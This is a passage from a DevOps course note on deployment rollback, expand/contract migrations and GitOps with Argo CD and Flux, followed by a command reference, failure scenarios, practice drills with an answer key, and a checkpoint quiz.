- Revision history is limited by `revisionHistoryLimit` (default 10). Old ReplicaSets may be garbage-collected.
- `rollout undo` reverts the pod template, not ConfigMaps, Secrets, CRDs, or database schema.
- If the previous image tag was overwritten, "revision 3" may point to different bytes than it did originally. Deploy by digest to avoid this.
- `kubectl rollout restart` is a rolling restart, not a rollback. It does not change the image.

### Rollback for non-Kubernetes targets

- **Ansible:** keep the previous playbook/role version and variable set; run the previous commit. If a task is destructive, the rollback may need a separate restore playbook.
- **VM/AMI:** keep the previous image/AMI and launch template version; switch the ASG/instance to it.
- **Serverless:** keep the previous version/alias; shift traffic back.
- **Database:** restore from backup/PITR only as a last resort; it loses writes after the restore point. Prefer forward-fix with a backward-compatible schema.

### Database migrations: expand/contract

Never combine a destructive schema change with a code deploy. Use expand/contract:

1. **Expand:** add the new nullable column/table/index. Old code still works.
2. **Deploy** code that writes both old and new, reads old.
3. **Backfill** in bounded batches; monitor locks/replication lag.
4. **Switch reads** to the new column/table behind a flag.
5. **Bake** long enough to prove no consumer needs the old shape.
6. **Contract:** drop the old column/table in a later release.

Rollback limits:

- Adding a column is usually reversible.
- Dropping a column is not; the data is gone unless you have a backup.
- Renaming a column breaks old code; use a new column plus dual-write instead.
- A migration that takes a table lock can cause an outage even if the code is correct.

Test migrations on a production-sized copy, measure duration and lock impact, and make them idempotent where the tool allows.

---

## 12. GitOps

### Push vs pull

```text
Push deployment:
  CI ── credentials ──► cluster API
  (CI needs network access and a powerful kubeconfig)

Pull/GitOps:
  Git (desired state) ◄── CI opens a PR / updates digest
        ▲
        │ watch/reconcile
  Argo CD / Flux (in cluster) ──► cluster API
  (no inbound access from CI; cluster pulls)
```

| Property | Push CI/CD | Pull GitOps |
|---|---|---|
| Who has cluster credentials? | CI system | Controller in the cluster |
| Drift detection | Usually none | Continuous reconciliation |
| Audit trail | CI logs + deploy records | Git history + controller events |
| Rollback | Re-run old pipeline or `kubectl undo` | Revert Git commit (or controller rollback) |
| Secret distribution | CI secrets | Cluster secret mechanism (ESO/Sealed Secrets) |
| Failure mode | CI compromised → cluster compromised | Git compromised → cluster compromised |
| Complexity | Lower | Higher (controller, repo structure, RBAC) |

GitOps is not "CI but with YAML in Git." The defining property is **continuous reconciliation**: the controller compares desired state in Git to live state and corrects drift.

### Argo CD architecture

```text
Git repo (manifests)
   │  poll/webhook
   ▼
Argo CD application controller ──► compares desired vs live
   │                                   │
   │                                   ├── Synced / OutOfSync
   │                                   └── Healthy / Degraded / Progressing
   ▼
Kubernetes API ──► workloads
```

Core objects:

- **Application:** maps a Git path/revision to a cluster/namespace.
- **Project:** groups applications and restricts repos, clusters, and resource kinds.
- **Sync:** apply the desired manifests.
- **Health:** evaluate whether resources are healthy (not just applied).
- **Sync wave/hook:** order resources; run jobs before/after sync.

### Application manifest

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: capacity-report-staging
  namespace: argocd
spec:
  project: platform
  source:
    repoURL: https://github.com/my-org/k8s-manifests.git
    targetRevision: main
    path: overlays/staging/capacity-report
  destination:
    server: https://kubernetes.default.svc
    namespace: capacity-report
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
      - CreateNamespace=true
    retry:
      limit: 3
      backoff:
        duration: 10s
        factor: 2
        maxDuration: 3m
```

`prune: true` deletes resources that were removed from Git. `selfHeal: true` reverts manual changes. Both are powerful:

- A mistaken manifest deletion can prune a production resource.
- An emergency `kubectl edit` will be reverted, possibly during an incident.
- A bad Git commit can propagate to every cluster that tracks it.

Protect the Git repo accordingly, and use sync windows/maintenance windows if you need controlled change periods.

### Argo CD commands

```bash
argocd app list
argocd app get capacity-report-staging
argocd app diff capacity-report-staging
argocd app sync capacity-report-staging --prune
argocd app wait capacity-report-staging --health --timeout 300
argocd app history capacity-report-staging
argocd app rollback capacity-report-staging 7
```

Representative `argocd app get` output:

```text
Name:               argocd/capacity-report-staging
Project:            platform
Server:             https://kubernetes.default.svc
Namespace:          capacity-report
URL:                https://argocd.example.com/applications/capacity-report-staging
Repo:               https://github.com/my-org/k8s-manifests.git
Target:             main
Path:               overlays/staging/capacity-report
SyncWindow:         Sync Allowed
Sync Policy:        Automated (Prune)
Sync Status:        OutOfSync from main (a1b2c3d)
Health Status:      Degraded

GROUP  KIND        NAMESPACE          NAME               STATUS  HEALTH   HOOK  MESSAGE
apps   Deployment  capacity-report    capacity-report    Synced  Degraded        deployment "capacity-report" exceeded progress deadline
```

**Interpretation:** "Synced" means the manifests were applied; "Degraded" means the live resources are not healthy. Sync status and health status are independent. A synced app can be broken.

`OutOfSync` means live state differs from Git. Causes: a manual edit, a failed sync, a webhook delay, a resource that mutates itself (HPA replicas, defaulted fields), or a controller that cannot apply a resource.

### Rollback in GitOps

Preferred: **revert the Git commit** that introduced the bad digest/manifest. The controller reconciles to the previous state, and the audit trail is clear.

```bash
git revert --no-edit <bad-commit>
git push
argocd app wait capacity-report-prod --health --timeout 300
```

Emergency: `argocd app rollback <app> <revision>` syncs an older revision. If automated sync is enabled, it may immediately reconcile back to `HEAD`, undoing your rollback. In that case, disable automated sync first or revert Git. Know which mode you are in before the incident.

`argocd app rollback` also does not revert database migrations, external side effects, or secrets managed outside Git.

### Drift

Drift is any difference between desired and live state. Common sources:

- `kubectl edit`/`kubectl patch` during an incident.
- HPA changing `replicas` (expected; configure ignoreDifferences).
- A mutating webhook adding defaults.
- A controller updating status fields (Argo CD normally ignores status).
- A deleted/recreated resource with a different UID.

```yaml
ignoreDifferences:
  - group: apps
    kind: Deployment
    jsonPointers:
      - /spec/replicas
```

Do not ignore a field just to make the diff green. Ignore only fields that another controller legitimately owns, and document why.

### Flux equivalents

```bash
flux get kustomizations
flux get helmreleases -A
flux reconcile kustomization apps --with-source
flux suspend kustomization apps
flux resume kustomization apps
```

Flux uses `GitRepository`, `Kustomization`, and `HelmRelease` objects. Argo CD uses `Application`/`ApplicationSet`. The concepts are similar; the operational commands and failure modes differ.

### Secrets in GitOps

Never commit plaintext Secrets. Options:

| Approach | How it works | Trade-off |
|---|---|---|
| **Sealed Secrets** | Encrypt with cluster public key; controller decrypts | Cluster-specific; rotating the key/re-encrypting is work |
| **SOPS + age/KMS** | Encrypt values in Git; decrypt in CI/controller | Key management; partial-file encryption needs care |
| **External Secrets Operator** | Sync from AWS Secrets Manager/Vault/etc. | Requires workload identity and network access; secret exists in cluster |
| **Vault Agent/CSI** | Inject secrets at runtime | More moving parts; app changes may be needed |

Whichever you choose, the Git repo must not contain a decryption key, a cloud credential, or a plaintext `.env`.

### Repo layout

```text
k8s-manifests/
├── base/
│   └── capacity-report/
│       ├── deployment.yaml
│       ├── service.yaml
│       └── kustomization.yaml
├── overlays/
│   ├── staging/
│   │   └── capacity-report/
│   │       ├── kustomization.yaml
│   │       └── patch.yaml
│   └── prod/
│       └── capacity-report/
│           ├── kustomization.yaml
│           └── patch.yaml
└── projects/
    └── platform.yaml
```

Promotion is a PR from staging to prod (or a digest update PR). The prod PR requires platform review. The app repo's CI cannot silently change prod; it can only propose a change.

Alternative: a monorepo with `apps/` and `clusters/`, protected by `CODEOWNERS`. Simpler to discover, but a single compromised token may have a wider blast radius. Choose based on team size and review capacity, not fashion.

### GitOps anti-patterns

- CI runs `kubectl apply` **and** Argo CD reconciles the same resources. Two owners fight; drift is constant.
- Automatic sync to prod with no branch protection or review.
- Storing secrets in Git "temporarily."
- Ignoring every diff so the dashboard is green.
- Using `latest` tags, so Git does not identify the deployed artifact.
- No sync window for high-risk changes; a bad commit deploys at 02:00 with no one watching.
- Treating `Synced` as `Healthy`.
- Rollback via `argocd app rollback` while auto-sync is on, then wondering why it reverted.

---

## 13. When to use push CD vs GitOps

| Situation | Better fit |
|---|---|
| Single cluster, small team, simple app | Push CD is fine; less machinery |
| Many clusters/environments, compliance audit | GitOps |
| Strong need for drift detection | GitOps |
| CI cannot reach the cluster network | GitOps (pull) |
| Emergency hotfix culture with poor Git discipline | Fix the culture first; GitOps will amplify it |
| Regulated environment requiring reviewed desired state | GitOps + protected repos |
| Short-lived preview environments per PR | Push or ApplicationSet; depends on lifecycle |
| Database migrations | Neither solves them; use a migration job with expand/contract |

A mature team may use both: push-based deploys for legacy VM workloads, GitOps for Kubernetes, and Ansible for host configuration. The important thing is one owner per resource and a clear rollback path.

---

## 14. A reference setup for this repository's tools

### App repo CI

- `lint`: `ruff`, `mypy`, `shellcheck`, `ansible-lint`.
- `test`: `pytest` matrix; `bats` for shell.
- `build`: wheel + checksums; upload artifact.
- `image` (optional): build/push by digest; SBOM; sign.
- `manifest-update` (optional): open a PR to the manifest repo with the new digest. Do not push directly to `main`.

### Ansible in CI

```yaml
  ansible-lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: |
          pip install ansible-core ansible-lint yamllint
          ansible-galaxy collection install -r requirements.yml
      - run: yamllint .
      - run: ansible-lint
      - run: ansible-playbook -i inventory.ini site.yml --syntax-check
```

This proves syntax and style. It does **not** prove the playbook converges a host. That requires a disposable VM and a real run (`--check --diff`, then apply), ideally in a scheduled integration job or a Molecule scenario.

### Deployment job for a kind cluster (lab-safe)

For the lab, avoid cloud credentials. Two safe options:

1. **Self-hosted runner on the Linux VM** that hosts kind. The deploy job runs `kubectl` against the local cluster. Restrict the runner to this private repo, use a dedicated low-privilege user, and do not attach it to public repos.
2. **Manual/paper deploy**: the workflow builds and verifies the artifact; the learner runs the deploy commands against kind from the VM. This proves the CI half without pretending a hosted runner can reach a local cluster.

If you use Argo CD on kind, the cluster pulls from a public manifest repo. The CI job updates the repo (or you do it manually), and Argo CD reconciles. That is a real GitOps loop with no inbound network to your laptop.

### Promotion flow

```text
PR → CI (lint/test/build) → merge to main → release workflow builds digest
   → PR to manifests/overlays/staging with digest → Argo CD sync staging
   → verify staging → PR to manifests/overlays/prod → approval → Argo CD sync prod
   → verify prod → record digest and rollback plan
```

Every arrow is reviewable. Every state is identified by a digest. Every rollback is a Git revert or a redeploy of a known digest.

---

## 15. Command field manual

### `gh`

```bash
gh auth status
gh run list --limit 10
gh run view <run-id>
gh run view <run-id> --log-failed
gh run watch <run-id> --exit-status
gh run download <run-id> -n <artifact-name> -D ./artifact
gh run rerun <run-id> --failed
gh workflow list
gh workflow run deploy.yml -f environment=staging -f image_digest=sha256:...
gh workflow view deploy.yml
```

**Why:** inspect and operate pipelines without clicking through the UI. `--log-failed` is the fastest path to the first real error. `gh run rerun --failed` re-runs only failed jobs; it does not fix a flaky test, and it may reuse the same commit.

**Scenario:** a PR check is red but the log is huge. Run `gh run view <id> --log-failed`, find the first failing command, reproduce it locally with the same Python version and env vars.

**Mistake:** rerunning a failed deploy without checking whether the first attempt partially applied. Some steps are not idempotent; rerunning can duplicate side effects.

### `act`

```bash
act -l
act pull_request -j test
act push -j build
act workflow_dispatch -W .github/workflows/deploy.yml --input environment=staging
```

**Why:** local syntax/logic feedback. **Limits:** no OIDC, no environment approvals, different runner image, secrets supplied locally. Do not treat a green `act` run as CI proof.

### `kubectl rollout`

```bash
kubectl rollout status deployment/capacity-report -n prod --timeout=180s
kubectl rollout history deployment/capacity-report -n prod
kubectl rollout undo deployment/capacity-report -n prod --to-revision=3
kubectl rollout pause deployment/capacity-report -n prod
kubectl rollout resume deployment/capacity-report -n prod
kubectl rollout restart deployment/capacity-report -n prod
```

**Why:** observe and control a rolling update. `status` blocks until complete or timeout and returns non-zero on failure — use it in CI. `undo` reverts the pod template to a previous ReplicaSet. `restart` only restarts pods with the same template.

**Mistake:** running `undo` before checking whether the problem is a ConfigMap/Secret or a database migration. `undo` will not fix those.

### `kubectl diff` / `apply`

```bash
kubectl diff -f deployment.yaml
kubectl apply --dry-run=server -f deployment.yaml
kubectl apply -f deployment.yaml
```

**Why:** `diff` shows what would change (exit code 1 when differences exist, which is normal). `--dry-run=server` runs validation/admission/mutation on the server without persisting. `--dry-run=client` only validates locally and can miss admission rejections.

**Safety:** review the diff before applying to prod. A `diff` that shows a full replacement of a StatefulSet or a PVC is a red flag.

### `argocd`

```bash
argocd login argocd.example.com --sso
argocd app list
argocd app get <app>
argocd app diff <app>
argocd app sync <app> --prune
argocd app wait <app> --health --timeout 300
argocd app history <app>
argocd app rollback <app> <revision>
argocd app set <app> --sync-policy none
```

**Why:** inspect desired vs live, sync deliberately, and roll back. `--prune` deletes resources removed from Git; use it intentionally. `app wait --health` distinguishes "applied" from "healthy."

**Mistake:** syncing a prod app with `--prune` while a resource is temporarily missing from Git due to a bad merge. Review the diff first.

### `flux`

```bash
flux get kustomizations
flux get helmreleases -A
flux reconcile kustomization apps --with-source
flux suspend kustomization apps
flux resume kustomization apps
```

**Why:** force a reconciliation without waiting for the poll interval, or suspend a controller during maintenance. `--with-source` also pulls the latest Git revision; without it, Flux may reconcile the last fetched commit.

### `cosign`, `syft`, `grype`

```bash
cosign sign --yes ghcr.io/my-org/capacity-report@sha256:...
cosign verify ghcr.io/my-org/capacity-report@sha256:... \
  --certificate-identity-regexp 'https://github.com/my-org/capacity-report/.github/workflows/release.yml@refs/heads/main' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
syft ghcr.io/my-org/capacity-report@sha256:... -o spdx-json > sbom.spdx.json
grype sbom:sbom.spdx.json
```

**Why:** establish artifact identity and inspect dependencies. `grype` exits non-zero when vulnerabilities at/above the configured severity are found; decide the gate threshold deliberately, or the pipeline will be permanently red.

**Mistake:** signing an artifact you did not build, or verifying only the tag. Verify the digest and the expected workflow identity.

### `aws sts` / IAM

```bash
aws sts get-caller-identity
aws iam list-open-id-connect-providers
aws iam get-role --role-name gha-staging-deploy
aws iam get-role --role-name gha-staging-deploy --query 'Role.AssumeRolePolicyDocument'
```

**Why:** prove which identity the job is using and inspect the trust policy that authorizes it. `get-caller-identity` is the first command in any cloud-auth debug.

**Mistake:** assuming the role name in the workflow matches the role that was created. Check the ARN and account.

---

## 16. Failure scenarios

### A — Workflow does not run

**Evidence:** no run in `gh run list`; the Actions tab shows nothing for the commit.

Check:

- Is the workflow file on the default branch? Some events only use the default branch's workflow definition.
- Does the `on:` block match the event/branch/path? A `paths:` filter can exclude the changed files.
- Is the workflow disabled or the repo's Actions permission restricted?
- Is the YAML valid? A tab character or a misplaced key can make the workflow invisible.
- For `pull_request`, is the PR from a fork? The base repo's workflow runs, but some events/behaviors differ.

### B — `Resource not accessible by integration`

**Evidence:** a step fails when calling the GitHub API, pushing a package, or commenting on a PR.

The `GITHUB_TOKEN` lacks the scope. Add the narrowest job-level permission:

```yaml
permissions:
  contents: read
  pull-requests: write
```

Do not switch to a personal access token as a first fix. PATs are long-lived, broad, and tied to a person.

### C — OIDC `AccessDenied`

**Evidence:** `Not authorized to perform sts:AssumeRoleWithWebIdentity`.

Compare the token's `aud` and `sub` claims to the trust policy. The most common cause is adding an environment (which changes `sub` to `environment:<name>`) without updating the policy. The second most common is a repo rename or a branch mismatch.

### D — Tests pass locally, fail in CI

**Evidence:** the failing assertion is environment-dependent (time, locale, path, network, ordering).

Check Python/Node version, OS/libc, timezone, locale, working directory, file case sensitivity, missing service containers, environment variables, and test isolation. Reproduce with the same container image if possible. Do not "fix" it with `sleep 5` unless you can explain the race.

### E — Deploy job is skipped

**Evidence:** the job shows as skipped, not failed.

Check:

- `if:` conditions (`github.ref`, event name, input).
- Environment protection: a required reviewer has not approved, or a wait timer is active.
- `needs:` dependency failed or was skipped.
- Concurrency: a previous run holds the group, or `cancel-in-progress` cancelled it.
- Branch protection/deployment branch policy rejects the ref.

### F — Image pull error after deploy

**Evidence:** pods in `ImagePullBackOff`/`ErrImagePull`; `kubectl describe pod` shows the registry error.

Check the image reference (typo, missing digest, private registry), imagePullSecret, registry auth, and whether the tag/digest exists. A successful CI push to GHCR does not automatically grant the cluster pull access to a private package.

### G — Rollout succeeds but the app returns 500s

**Evidence:** pods Ready, rollout status success, smoke test or metrics show errors.

Readiness only proves the probe passed. Check application logs, missing ConfigMap/Secret keys, dependency connectivity, migrations, and whether the new code expects a schema/config that was not deployed. This is why smoke tests and error-rate checks are part of the deploy.

### H — Pipeline green, but production runs the old image

**Evidence:** the deployment's image digest does not match the artifact digest from the run.

Causes: mutable tag (`latest`) pulled by a node with a cached image; the manifest update job targeted the wrong overlay; Argo CD synced a different revision; the deploy job updated a different namespace/cluster; `imagePullPolicy: IfNotPresent` with a reused tag.

Fix: deploy by digest, verify the live digest, and set `imagePullPolicy: Always` only as a mitigation (it still cannot distinguish two builds with the same tag once the tag moves).

### I — Rollback does not restore service

**Evidence:** after `rollout undo`, errors persist or a new error appears.

Possible causes: the database migration is not backward-compatible; a ConfigMap/Secret changed independently; the previous image was garbage-collected or the tag was overwritten; the problem is external (DNS, dependency, traffic); the rollback itself is still progressing.

Preserve evidence, check the previous revision's full template (not just the image), and consider rolling forward with a fix if data/schema changed.

### J — Ansible works locally, fails in CI

**Evidence:** `UNREACHABLE`, host-key verification, or missing collections.

CI has no SSH agent/key, no `known_hosts` entry, and a clean environment with only declared dependencies. Install collections from `requirements.yml`, provide the key via a secret, add the host key deliberately, and use a dedicated CI inventory. Do not disable host-key checking to make it pass.

---

## 17. Drills

Answer from evidence before reading the answer key.

### Drill 1 — The environment claim

A deploy job worked yesterday. Today someone added `environment: production` to the job. It now fails with `AccessDenied` on `AssumeRoleWithWebIdentity`. The IAM role trust policy is:

```json
"StringLike": {
  "token.actions.githubusercontent.com:sub": "repo:my-org/app:ref:refs/heads/main"
}
```

The job runs on `main`. What changed, what evidence would you collect, and what is the minimal fix?

### Drill 2 — The green pipeline, the broken service

The pipeline is green: lint, tests, build, `kubectl set image`, and `kubectl rollout status` all pass. Five minutes later, 12% of requests return HTTP 500. The pods are `Running` and `Ready`. What are the first five pieces of evidence, and what would you do first?

### Drill 3 — The fork PR

An external contributor opens a PR. The CI workflow runs lint and tests successfully, but the deploy job is skipped and the "comment on PR" step fails with `Resource not accessible by integration`. Is this a bug? What should the workflow do instead?

### Drill 4 — The mutable tag

A hotfix is deployed with `image: ghcr.io/my-org/app:prod`. The next day, a rollback to "the previous version" still runs the hotfix code. `kubectl rollout history` shows two revisions, but both use the same tag. What happened, and how do you prevent it?

### Drill 5 — The Ansible lockout

You run a hardening playbook against a VM over SSH. It changes `sshd_config`, restarts SSH, and the connection drops. The play fails. You can still access the VM console. What is your recovery order, and what should the playbook have done differently?

### Drill 6 — The GitOps revert that did not stick

You run `argocd app rollback capacity-report-prod 12`. The app reports Synced for a minute, then returns to the bad version. Automated sync is enabled. Why, and what are the two correct rollback paths?

---

## 18. Answer key

### Drill 1

Adding `environment:` changes the OIDC `sub` claim from `repo:my-org/app:ref:refs/heads/main` to `repo:my-org/app:environment:production`. The trust policy no longer matches.

Evidence: decode the token payload, compare `aud`/`sub` to the trust policy, check the workflow's `environment:` value, and confirm the role ARN. Minimal fix: update the trust policy `sub` to `repo:my-org/app:environment:production` (scoped to that environment), or remove the environment if it was added by mistake (but then you lose the protection rules). Verify with `aws sts get-caller-identity` before deploying.

### Drill 2

First: stabilize. If the error rate is user-facing and correlated with the deploy, roll back to the previous digest (or disable the feature flag), while preserving logs/metrics. Then collect:

1. Deployment diff and image digest vs previous.
2. Application logs for the new pods (exception class, dependency errors).
3. Readiness/liveness probe configuration and whether it checks dependencies.
4. ConfigMap/Secret diff and missing keys.
5. Dependency health (database, cache, upstream API) and error-rate/latency metrics by endpoint.
6. Recent non-deploy changes (DNS, certificate, traffic, feature flag).

A `Ready` pod only means the probe passed. The 500s could be a missing config key, a migration that did not run, or an application bug. Rollback is the right first move if the change is correlated and the blast radius is growing; diagnose after service is restored, using preserved evidence.

### Drill 3

Not a bug. Fork PRs run with a read-only `GITHUB_TOKEN` and no secrets. The deploy job is correctly skipped (deploy should not run from untrusted forks), and commenting requires `pull-requests: write`, which the fork token does not have.

The workflow should:

- run lint/tests on `pull_request` with `contents: read`;
- not deploy from `pull_request`;
- deploy from `push` to a protected branch or `workflow_dispatch`;
- if a comment is needed, use a separate trusted workflow (`workflow_run` or `pull_request_target`) that does not checkout/run untrusted code, or accept that fork PRs get no bot comment.

Do not switch to `pull_request_target` with a checkout of the PR head to "make it work."

### Drill 4

The tag `prod` was moved to the hotfix image. `kubectl rollout history` records pod-template revisions, not image bytes. Both revisions reference the same mutable tag, so "rollback" resolves the tag again and gets the hotfix.

Prevention: deploy by digest, record the digest in the deployment annotation, and make tags immutable in the registry. Rollback means redeploying the previous digest. Verify the live digest after rollback.

### Drill 5

Recovery order:

1. Use the console (out-of-band access) to log in.
2. Inspect `sshd` status and config: `systemctl status ssh`, `sshd -t`, recent logs (`journalctl -u ssh`), and the backup of `sshd_config`.
3. Restore the last known-good config or fix the specific directive; validate with `sshd -t` before restarting.
4. Keep the existing session/console open until a new SSH session succeeds.
5. Document the change and add a test.

The playbook should have:

- taken a backup of `sshd_config`;
- used `validate: 'sshd -t -f %s'` on the template;
- changed one host/`serial: 1` at a time;
- kept a console session open;
- had a rollback task or a documented recovery path;
- tested with `--check --diff` first.

### Drill 6

`argocd app rollback` syncs an older revision, but automated sync sees `HEAD` (the bad commit) and reconciles back. The rollback is temporary.

Correct paths:

1. **Revert Git:** `git revert <bad-commit>` and push; let automated sync reconcile to the reverted state.
2. **Disable automated sync first:** `argocd app set <app> --sync-policy none`, then rollback/sync the desired revision, investigate, and re-enable automated sync after fixing `HEAD`.

The Git revert is preferred: it keeps Git as the source of truth and leaves an audit trail.

---

## 19. Checkpoint

1. What is the difference between continuous delivery and continuous deployment?
2. What does a build artifact need to be promotable across environments?
3. Why is `kubectl apply` returning 0 not proof that a deploy succeeded?
4. What does `kubectl rollout status` check, and what does it not check?
5. Why deploy by digest instead of a tag?
6. What is the difference between a readiness probe and a liveness probe?
7. What is a smoke test, and what should it cover?
8. Why can a canary with 1% traffic fail to detect a regression?
9. What is the difference between `kubectl rollout undo` and `kubectl rollout restart`?
10. What can `rollout undo` not revert?
11. Why is a destructive database migration incompatible with a simple rollback?
12. Describe expand/contract in four steps.
13. What is the difference between push CD and GitOps?
14. What does Argo CD's `Synced` status mean? What about `Healthy`?
15. Why can `argocd app rollback` be undone by automated sync?
16. What is drift, and what causes it?
17. Why is `pull_request_target` dangerous?
18. How does OIDC remove the need for static cloud keys?
19. What claim scopes an AWS role to a GitHub environment?
20. Why pin a third-party action to a commit SHA?
21. What is the risk of a self-hosted runner on a public repo?
22. Why should build and deploy be separate jobs?
23. What is the first thing you check when a workflow does not run?
24. What is the first thing you check when OIDC fails?
25. What evidence do you preserve before rolling back?

Then take [the checkpoint](07-checkpoint.md) and complete [Lab 7.4](06-labs-part2.md), which turns this note into a working pipeline.
